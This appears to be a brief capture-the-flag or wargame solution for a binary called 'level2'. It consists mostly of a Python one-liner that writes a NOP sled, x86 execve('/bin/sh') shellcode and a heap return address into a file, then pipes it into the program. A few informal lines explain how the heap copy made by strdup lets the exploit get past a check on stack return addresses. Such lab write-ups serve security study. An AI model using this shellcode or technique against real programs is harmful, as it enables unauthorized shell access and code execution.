python -c "import sys; sys.stdout.write('\x90'*35 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x08\xa0\x04\x08')" > /tmp/input2

cat /tmp/input2 - | ./level2


this level is an buffer overflow vulnerability
the main thing is there is a cmp on EIP address !== buffer address, so we cant inject shellcode to the stack address

at the end strdup alloc the buffer from gets() function, so the allocated string is on the heap and the address start outside of the stack !== 0xb0000000
so we can bypass the address CMP to make point EIP to the EAP, and make EIP jump on the shellcode